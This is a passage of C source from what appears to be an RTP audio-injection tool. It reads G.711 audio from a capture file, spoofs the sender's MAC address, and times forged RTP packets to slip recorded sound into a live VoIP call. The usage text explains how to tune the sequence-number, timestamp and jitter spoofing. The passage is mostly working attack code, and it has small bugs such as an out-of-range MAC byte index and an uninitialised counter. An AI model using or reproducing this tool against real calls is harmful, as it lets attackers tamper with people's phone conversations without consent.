        //                   memory as needed for the next packet).
        //
        
        rc = pcap_next_ex ( h_pcap_tcpdump_rtp, &ppcap_pkthdr, &packet );
         
        switch ( rc ) {
            case -2: {
                //  EOF
                bPacketsRemain = false;
                break;
            }            
            case -1: {
                //  error occurred reading file
                pcap_perror ( h_pcap_tcpdump_rtp,
                              "\nError reading pre-recorded audio "
                              "capture into memory! " );
                pcap_close ( h_pcap_tcpdump_rtp );
                h_pcap_tcpdump_rtp = NULL;

                return false;
            }
            case 1: {
                //  no error reading packet
                
                numPackets++;
                
                if ( numPackets == 1 && bVerbose ) {
                    printf( "\n\nRTP Header of 1st packet in pre-recorded audio:" );
                    decodeAndPrintRTPMsg ( packet );
                }
                
                //
                //  FIXME: tool only supports G.711 audio at this time
                //
                
                rtp_hdr = ( struct rfc1889_rtp_hdr * ) ( packet + offset_to_rtp_msg );
                
                if ( rtp_hdr->payloadType !=
                     __RTPINSERTSOUND_G711_PAYLOAD_TYPE ) {
                    printf ( "\nPacket #%u of the pre-recorded audio file"
                             "\nis not bearing G.711 u-law encoded audio"
                             "\nPayload type = %u\n",
                             numPackets, rtp_hdr->payloadType );                         
                    pcap_close ( h_pcap_tcpdump_rtp );
                    h_pcap_tcpdump_rtp = NULL;
 
                    return false;
                }
                
                pUlawByte = ( (unsigned char *) packet ) + offset_to_rtp_payload;
                
                memcpy ( &(pcmuSamplesToInsert[ numPackets - 1 ]),
                         pUlawByte,
                         __RTPINSERTSOUND_G711_PAYLOAD_LEN );

#if __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_ETHERNET

                //  Since the Source MAC of the legitimate RTP transmitter is going to be 
                //  spoofed, mark the spoofed packets so this tool will know to reject "incoming"
                //  packets with that mark. The "mark" is the pattern 0,1,0,1,0,1 in the low
                //   order bit of the first 6 RTP payload bytes. 

                pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 0 ] =              
                    pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 0 ] & 0xfe;
                pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 1 ] =              
                    pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 1 ] | 0x01;
                pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 2 ] =              
                    pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 2 ] & 0xfe;
                pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 3 ] =              
                    pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 3 ] | 0x01;
                pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 4 ] =              
                    pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 4 ] & 0xfe;
                pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 5 ] =              
                    pcmuSamplesToInsert[ numPackets - 1 ].pcmu_value[ 5 ] | 0x01;

#endif
                    
                if ( numPackets ==
                     __RTPINSERTSOUND_G711_MAX_NUMBER_RTP_MSGS_TO_INSERT ) {
                    bPacketsRemain = false;
                }
                break;
            }            
            default: {
                //  no other error code should be returned when using pcap_next_ex( ) to
                //  read a "saved" file.
                printf ( "\nReceived an unexpected return code from "
                         "pcap_next_ex( ): %d ", rc );
                pcap_perror ( h_pcap_tcpdump_rtp, NULL );
                pcap_close ( h_pcap_tcpdump_rtp );
                h_pcap_tcpdump_rtp = NULL;

                return false;
            }
        }  //  end switch ( rc )
        
    } while ( bPacketsRemain );
    
    *numG711PacketsLoaded = numPackets;

    pcap_close ( h_pcap_tcpdump_rtp );
    h_pcap_tcpdump_rtp = NULL;
    
    return true;

} // end preloadTCPdumpAudio                                


//-----------------------------------------------------------------------------
//
//  delayTransmitOfSpoofedPacket ( unsigned int codecIntervalUsec )
//
//  This routine returns to the caller when the
//  the time-of-day is >= the time-of-day to output
//  the next spoofed RTP packet. However, if
//  the time-of-day becomes greater than or equal to
//  the time-of-day the next legitimate packet is
//  expected, we have really screwed up. A failure
//  is declared and the tool is exited.
//
//  Limitation: The time-of-day the next spoofed packet
//                         should be output cannot be later than
//                         the time-of-day the next legitimate RTP
//                         packet is expected.
//
//-----------------------------------------------------------------------------

void delayTransmitOfSpoofedPacket ( unsigned int codecIntervalUsec ) {

    int i;
    
    bool bOutputTrigger = false;

//
//  Note: Time of day as represented by the timeval structure is expressed
//             as seconds + usecs since the Epoch time reference.
//
    
    struct timeval currentTOD;   
    struct timeval nextLegitimatePacketTOD;
    struct timeval nextSpoofPacketOutputTOD;

//
//  Based on the TOD the last legitimate RTP packet was received,
//  what time in the future should the next legitimate packet be
//  expected?
//
    
    nextLegitimatePacketTOD.tv_sec  = ppcap_pkthdr->ts.tv_sec;
    nextLegitimatePacketTOD.tv_usec = ppcap_pkthdr->ts.tv_usec;
    
    nextLegitimatePacketTOD.tv_usec += codecIntervalUsec;
    
    //  TOD next legitimate packet is expected is in the next second?
    
    if ( nextLegitimatePacketTOD.tv_usec > 1000000 ) {
        nextLegitimatePacketTOD.tv_usec -= 1000000;  // adjust usec downward
        nextLegitimatePacketTOD.tv_sec++;            // adjust sec upward
    }
    
//
//  Based on the TOD the last legitimate RTP packet was received,
//  what time in the future should the next spoofed packet be transmitted?
//
//  Note: Time of day as represented by the timeval structure is expressed
//             as seconds + usecs since the Epoch time reference.
//
    
    nextSpoofPacketOutputTOD.tv_sec  = ppcap_pkthdr->ts.tv_sec;
    nextSpoofPacketOutputTOD.tv_usec = ppcap_pkthdr->ts.tv_usec;
        
    nextSpoofPacketOutputTOD.tv_usec += jitterDelayUsec;
    
    //  next spoofed packet transmit time-of-day is in the next second?
    
    if ( nextSpoofPacketOutputTOD.tv_usec > 1000000 ) {
        nextSpoofPacketOutputTOD.tv_usec -= 1000000;  // adjust usec downward
        nextSpoofPacketOutputTOD.tv_sec++;            // adjust sec upward
    }
    
    while ( !bOutputTrigger ) {
        gettimeofday( &currentTOD, NULL );  // retrieve current TimeOfDay

        // Does current TOD exceed TOD next legitimate RTP packet is expected?
        
        deltaTSec = nextLegitimatePacketTOD.tv_sec - currentTOD.tv_sec;

        if ( deltaTSec < 0 ) {
            printf ( "\nError: Failed to output spoof RTP packet #%u "
                     "%u usec before next legitimate RTP packet!! (1)\n",
                      i, jitterProximityUsec );
            printf ( "\nnextLegitimatePacketTOD:\n"
                     "tv_sec = %d, tv_usec = %d\n"
                     "\nnextSpoofPacketOutputTOD:\n"
                     "tv_sec = %d, tv_usec = %d\n"
                     "\ncurrentTOD:\n"
                     "tv_sec = %d, tv_usec = %d\n",
                     nextLegitimatePacketTOD.tv_sec,
                     nextLegitimatePacketTOD.tv_usec,
                     nextSpoofPacketOutputTOD.tv_sec,
                     nextSpoofPacketOutputTOD.tv_usec,
                     currentTOD.tv_sec,
                     currentTOD.tv_usec );
            CleanupAndExit ( EXIT_FAILURE );  // control does not return here
        }

        if ( deltaTSec == 0 ) {
    
            //  Times to compare are within same second, so we can
            //  compare usec components directly.
    
            deltaTUsec =
                nextLegitimatePacketTOD.tv_usec - currentTOD.tv_usec;
            
            if ( deltaTUsec < 0 ) {
                printf ( "\nError: Failed to output spoof RTP packet #%u "
                         "%u usec before legitimate RTP packet!! (2)\n",
                         i, jitterProximityUsec );
                printf ( "\nnextLegitimatePacketTOD:\n"
                         "tv_sec = %d, tv_usec = %d\n"
                         "\nnextSpoofPacketOutputTOD:\n"
                         "tv_sec = %d, tv_usec = %d\n"
                         "\ncurrentTOD:\n"
                         "tv_sec = %d, tv_usec = %d\n",
                         nextLegitimatePacketTOD.tv_sec,
                         nextLegitimatePacketTOD.tv_usec,
                         nextSpoofPacketOutputTOD.tv_sec,
                         nextSpoofPacketOutputTOD.tv_usec,
                         currentTOD.tv_sec,
                         currentTOD.tv_usec );
                CleanupAndExit ( EXIT_FAILURE );  // control does not return here
            }                
        }
        
        //  So far so good. The currentTOD is less than the time the next legitimate
        //  RTP packet is expected. Is it time to output the next spoofed packet?
        
        //  Compute deltaT between TOD of next spoof packet output and current TOD

        deltaTSec = nextSpoofPacketOutputTOD.tv_sec - currentTOD.tv_sec;
        
        if ( deltaTSec < 0 ) {  // must be passed time to output spoof packet
            bOutputTrigger = true;
        }

        if ( deltaTSec == 0 ) {
    
            //  Times to compare are within same second, so we can
            //  compare usec components directly.
    
            deltaTUsec =
                nextSpoofPacketOutputTOD.tv_usec - currentTOD.tv_usec;
            
            if ( deltaTUsec <= 0 ) { // must be passed time to output spoof packet
                bOutputTrigger = true;
            }
        }
    } // end while ( not reached spoofed packet output time )

/*
    printf ( "\n--------------------------\n"
             "\nnextLegitimatePacketTOD:\n"
             "tv_sec = %d, tv_usec = %d\n"
             "\nnextSpoofPacketOutputTOD:\n"
             "tv_sec = %d, tv_usec = %d\n"
             "\ncurrentTOD:\n"
             "tv_sec = %d, tv_usec = %d\n"
             "jitterProximityUsec = %u usec\n",
             nextLegitimatePacketTOD.tv_sec,
             nextLegitimatePacketTOD.tv_usec,
             nextSpoofPacketOutputTOD.tv_sec,
             nextSpoofPacketOutputTOD.tv_usec,
             currentTOD.tv_sec,
             currentTOD.tv_usec,
             jitterProximityUsec );
*/
    
} // end delayTransmitOfSpoofedPacket


//-----------------------------------------------------------------------------
//
//  decodeAndPrintRTPMsg ( const u_char *packet )
//
//  This routine actually prints most of the content
//  of the headers leading up to the actual RTP payload,
//  but not the payload itself.
//
//  The input parameter, packet, is presumed to point
//  to the start of the Ethernet frame. That Ethernet
//  frame is presumed to contain an RTP/UDP/IP
//  datagram.
//
//  In order, the headers are:
//       Ethernet
//       IP
//       UDP
//       RTP
//
//
//  Portability Issues:
//
//  It is presumed this routine is operating on a
//  little endian machine, requiring the swapping of
//  some of the header content that is in network
//  (i.e. big-endian order).
//
//  It should be noted that the structure used to 
//  define bit fields within the rtp header is very
//  likely also implementation dependent. This
//  routine was developed to execute on an Intel
//  machine (i.e. Pentium) running Red Hat Linux. 
//-----------------------------------------------------------------------------

void decodeAndPrintRTPMsg ( const u_char *packet ) {
    
//
//      Print some of the Ethernet header content
//

    unsigned int i = 0;
    
    char macString[18] = "";   //  6 hex bytes * 2 char/byte + 5 colons  + end-of-string
    
    eth_hdr = ( struct libnet_ethernet_hdr * ) packet;

    printf ( "\n\n-----------------\n\n");
        
    sprintf ( macString, "%02x:%02x:%02x:%02x:%02x:%02x", 
              eth_hdr->ether_shost[0],
              eth_hdr->ether_shost[1],
              eth_hdr->ether_shost[2],
              eth_hdr->ether_shost[3],
              eth_hdr->ether_shost[4],
              eth_hdr->ether_shost[5],
              eth_hdr->ether_shost[6] );
    
    printf ( "source      MAC: %s\n", macString );
    
    macString[0] = '\0';       //  re-initialize workspace string to NUL string
    
    sprintf ( macString, "%02x:%02x:%02x:%02x:%02x:%02x", 
              eth_hdr->ether_dhost[0],
              eth_hdr->ether_dhost[1],
              eth_hdr->ether_dhost[2],
              eth_hdr->ether_dhost[3],
              eth_hdr->ether_dhost[4],
              eth_hdr->ether_dhost[5],
              eth_hdr->ether_dhost[6] );
    
    printf ( "destination MAC: %s\n\n", macString );

//
//      Print some of the IP header content
//

    ip_hdr = ( struct libnet_ipv4_hdr * )
                ( packet + LIBNET_ETH_H );

    //  This union is a workspace permitting an IPv4 address to be accessed as a 
    //   byte array.
    
    union {
        uint32_t ip_addr;
        char ip_bytes[4];
    } ip_addr_union;
    
    char ip_addr_dotted[16];    // workspace to synthesize a dotted IPv4 addr

    ip_addr_dotted[0] = '\0';   //  initialize workspace string to NUL string

    ip_addr_union.ip_addr = ip_hdr->ip_src.s_addr;    

    sprintf( ip_addr_dotted, "%hu.%hu.%hu.%hu",
                ip_addr_union.ip_bytes[0],
                ip_addr_union.ip_bytes[1],
                ip_addr_union.ip_bytes[2],
                ip_addr_union.ip_bytes[3] ); 

    printf ( "source      IP: %s\n", ip_addr_dotted );

    ip_addr_dotted[0] = '\0';   //  initialize workspace string to NUL string

    ip_addr_union.ip_addr = ip_hdr->ip_dst.s_addr;    

    sprintf( ip_addr_dotted, "%hu.%hu.%hu.%hu",
                ip_addr_union.ip_bytes[0],
                ip_addr_union.ip_bytes[1],
                ip_addr_union.ip_bytes[2],
                ip_addr_union.ip_bytes[3] ); 

    printf ( "destination IP: %s\n\n", ip_addr_dotted );

//
//      Print some of the UDP header content
//

    udp_hdr = ( struct libnet_udp_hdr * )
                ( packet + LIBNET_ETH_H + LIBNET_IPV4_H );
    
    printf ( "source      port: %u\n",
                ntohs ( udp_hdr->uh_sport ) );
    
    printf ( "destination port: %u\n\n",
                ntohs ( udp_hdr->uh_dport ) );
    
    printf ( "UDP packet  length: %u\n\n",
                ntohs ( udp_hdr->uh_ulen ) );
            
    rtp_hdr = ( struct rfc1889_rtp_hdr * )
                ( packet + LIBNET_ETH_H + LIBNET_IPV4_H + LIBNET_UDP_H );
    
    printf ( "RTP message length: %u\n",
                ntohs ( udp_hdr->uh_ulen ) - LIBNET_UDP_H );
    
    printf ( "Size of RTP Header: %u\n", sizeof( struct rfc1889_rtp_hdr ) );
        
//
//      Print RTP header content
//

/*    
    printf ( "RTP Header Dump:\n");
    
    const u_char *rtp_hdr_bytes;
    
    rtp_hdr_bytes = packet + LIBNET_ETH_H + LIBNET_IPV4_H + LIBNET_UDP_H;
    
    printf ( "%02x %02x %02x %02x\n"
             "%02x %02x %02x %02x\n"
             "%02x %02x %02x %02x\n",
             rtp_hdr_bytes[0],
             rtp_hdr_bytes[1],
             rtp_hdr_bytes[2],
             rtp_hdr_bytes[3],
             rtp_hdr_bytes[4],
             rtp_hdr_bytes[5],
             rtp_hdr_bytes[6],
             rtp_hdr_bytes[7],
             rtp_hdr_bytes[8],
             rtp_hdr_bytes[9],
             rtp_hdr_bytes[10],
             rtp_hdr_bytes[11] );
*/
        
    printf ( "RTP Version: %u\n", rtp_hdr->version );
    
    printf ( "RTP Packet Padded?: %s\n",
                ( rtp_hdr->bPaddingIncluded == 0 )? "no":"yes" );
    
    printf ( "RTP Packet Fixed Hdr Followed by Extension Hdr?: %s\n",
                ( rtp_hdr->bExtensionIncluded == 0 )? "no":"yes" );
    
    printf ( "RTP Packet CSRC Count: %u\n", rtp_hdr->cc );

    printf ( "RTP Packet Marked?: %s\n",
                ( rtp_hdr->bMarker == 0 )? "no":"yes" );
    
    printf ( "RTP Packet Payload Type: %u\n", rtp_hdr->payloadType );
    
    printf ( "RTP Packet Sequence #: %u\n",
                ntohs ( rtp_hdr->sequenceNumber ) );
    
    printf ( "RTP Packet Timestamp: %u\n",
                ntohl ( rtp_hdr->timestamp ) );
    
    printf ( "RTP Packet SSRC: %u\n",
                ntohl ( rtp_hdr->ssrc ) );

    printf ( "\n-----------------\n\n");

    
} //  end decodeAndPrintRTPMsg


//-----------------------------------------------------------------------------
//
// catch_signals ( int signo )
//
// signal catcher and handler
//
//-----------------------------------------------------------------------------

void catch_signals ( int signo ) {
    switch ( signo ) {
        case	SIGINT:
        case	SIGTERM: {
            printf ( "\nexiting...\n" );
            CleanupAndExit ( EXIT_SUCCESS );
        }
    }
} // end catch_signals

//-----------------------------------------------------------------------------
//
// CleanupAndExit ( int status )
//
// Clean up and exit.
//
//-----------------------------------------------------------------------------

void CleanupAndExit ( int status ) {
    
    if ( h_pcap_live_rtp ) {
        if ( bVerbose ) {
            printf ( "\nclosing live pcap interface\n" );
        }
        pcap_close ( h_pcap_live_rtp );
        h_pcap_live_rtp = NULL;
    }
    
    if ( l ) {
        if ( bVerbose ) {
            printf ( "\ndestroying libnet handle\n" );
        }
        libnet_destroy ( l );
        l = NULL;
    }
    
    if ( sockfd > 0 ) {
        if ( bVerbose ) {
            printf ( "\nclosing socket used to obtain device MAC addr\n" );
        }
        close( sockfd );
        sockfd = 0;
    }
   
    printf ( "\n" );

    exit ( status );
} // End CleanupAndExit

//-------------------------------------------------------------------------------
//
// usage ( int status )
//
// Display command line usage.
//
//-------------------------------------------------------------------------------

void usage ( int status ) {
    printf ( "\n%s", __RTPINSERTSOUND_VERSION );
    printf ( "\n%s", __RTPINSERTSOUND_DATE    );
    printf ( "\n Usage:"                                                      );
    printf ( "\n Mandatory -"                                                 );
    printf ( "\n\tpathname of file whose audio is to be mixed into the"       );
    printf ( "\n\t    targeted live audio stream. If the file extension is"   );
    printf ( "\n\t    .wav, then the file must be a standard Microsoft"       );
    printf ( "\n\t    RIFF formatted WAVE file meeting these constraints:"    );
    printf ( "\n\t      1) header 'chunks' must be in one of two sequences:"  );
    printf ( "\n\t           RIFF, fmt, fact, data"                           );
    printf ( "\n\t             or"                                            );
    printf ( "\n\t           RIFF, fmt, data"                                 );
    printf ( "\n\t      2) Compression Code = 1 (PCM/Uncompressed)"           );
    printf ( "\n\t      3) Number of Channels = 1 (mono)"                     );
    printf ( "\n\t      4) Sample Rate (Hz) = 8000"                           );
    printf ( "\n\t      5) Significant Bits/Sample ="                         );
    printf ( "\n\t              signed,   linear 16-bit or"                   );
    printf ( "\n\t              unsigned, linear  8-bit"                      );
    printf ( "\n\t    If the file name does not specify a .wav extension,"    );
    printf ( "\n\t    then the file is presumed to be a tcpdump formatted"    );
    printf ( "\n\t    file with a sequence of, exclusively, G.711 u-law"      );
    printf ( "\n\t    RTP/UDP/IP/ETHERNET messages"                           );
    printf ( "\n\t    Note: Yep, the format is referred to as 'tcpdump'"      );
    printf ( "\n\t          even though this file must contain udp messages"  );
    printf ( "\n Optional -"                                                  );
    printf ( "\n\t-a source RTP IPv4 addr"                                    );
    printf ( "\n\t-A source RTP port"                                         );
    printf ( "\n\t-b destination RTP IPv4 addr"                               );
    printf ( "\n\t-B destination RTP port"                                    );
    printf ( "\n\t-f spoof factor - amount by which to:"                      );
    printf ( "\n\t     a) increment the RTP hdr sequence number obtained"     );
    printf ( "\n\t        from the ith legitimate packet to produce the"      );
    printf ( "\n\t        RTP hdr sequence number for the ith spoofed packet" );
    printf ( "\n\t     b) multiply the RTP payload length and add that"       );
    printf ( "\n\t        product to the RTP hdr timestamp obtained from"     );
    printf ( "\n\t        the ith legitimate packet to produce the RTP hdr"   );
    printf ( "\n\t        timestamp for the ith spoofed packet"               );
    printf ( "\n\t     c) increment the IP hdr ID number obtained from the"   );
    printf ( "\n\t        ith legitimate packet to produce the IP hdr ID"     );
    printf ( "\n\t        number for the ith spoofed packet"                  );
    printf ( "\n\t   [ range: +/- 1000, default: 2 ]"                         );
    printf ( "\n\t-i interface (e.g. eth0)"                                   );
    printf ( "\n\t-j jitter factor - the reception of a legitimate RTP"       );
    printf ( "\n\t     packet in the target audio stream enables the output"  );
    printf ( "\n\t     of the next spoofed packet. This factor determines"    );
    printf ( "\n\t     when that spoofed packet is actually transmitted."     );
    printf ( "\n\t     The factor relates how close to the next legitimate"   );
    printf ( "\n\t     packet you'd actually like the enabled spoofed packet" );
    printf ( "\n\t     to be transmitted. For example, -j 10 means 10%% of"   );
    printf ( "\n\t     the codec's transmission interval. If the transmission");
    printf ( "\n\t     interval = 20,000 usec (i.e. G.711), then delay the"   );
    printf ( "\n\t     output of the spoofed RTP packet until the time-of-day");
    printf ( "\n\t     is within 2000 usec (i.e. 10%%) of the time the next"  );
    printf ( "\n\t     legitimate RTP packet is expected. In other words,"    );
    printf ( "\n\t     delay 100%% minus the jitter factor, or 18,000 usec"   );
    printf ( "\n\t     in this example. The smaller the jitter factor, the"   );
    printf ( "\n\t     greater the risk you run of not outputting the current");
    printf ( "\n\t     spoofed packet before the next legitimate RTP packet"  );
    printf ( "\n\t     is received. Therefore, a factor > 10 is advised."     );
    printf ( "\n\t   [ range: 0 - 80, default: 80 = output spoof ASAP ]"      );
    printf ( "\n\t-p seconds to pause between setup and injection"            );
    printf ( "\n\t-h help - print this usage"                                 );
    printf ( "\n\t-v verbose output mode"                                     );
    printf ( "\n"                                                             );
    printf ( "\nNote: If you are running the tool from a host with multiple"  );
    printf ( "\n      ethernet interfaces which are up, be forewarned that"   );
    printf ( "\n      the order those interfaces appear in your route table"  );
    printf ( "\n      and the networks accessible from those interfaces might");
    printf ( "\n      compel Linux to output spoofed audio packets to an"     );
    printf ( "\n      interface different than the one stipulated by you on"  );
    printf ( "\n      command line. This should not affect the tool unless"   );
    printf ( "\n      those spoofed packets arrive back at the host through"  );
    printf ( "\n      the interface you have specified on the command line"   );
    printf ( "\n      (e.g. the interfaces have connectivity through a hub)." );
    printf ( "\n"                                                             );

    exit ( status );
}

